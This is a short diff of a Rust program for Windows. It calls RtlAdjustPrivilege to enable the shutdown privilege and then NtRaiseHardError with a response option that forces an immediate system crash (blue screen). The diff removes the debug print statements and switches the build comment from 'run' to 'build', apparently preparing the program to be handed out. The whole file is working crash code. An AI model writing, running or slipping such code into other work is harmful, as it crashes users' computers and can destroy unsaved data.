@@ -18,14 +18,12 @@ extern {
   fn NtRaiseHardError(ErrorStatus: LONG, NumberOfParameters: ULONG, UnicodeStringParameterMask: ULONG, Parameters: PULONG_PTR, ValidResponseOptions: ULONG, Response: PULONG) -> NTSTATUS; 
 }
 
-// cargo run --release --target x86_64-pc-windows-msvc
+// cargo build --release --target x86_64-pc-windows-msvc
 fn main (){
     unsafe {
-        println!("hello");
         let mut b : BOOLEAN = 1;
         let mut response : ULONG = 0 ;
         RtlAdjustPrivilege(19, 1, 0, &mut b);
         NtRaiseHardError(STATUS_ASSERTION_FAILURE,0,0,0 as *mut _,6, &mut response);
-        println!("{} {} ",b,response );
     }
 }
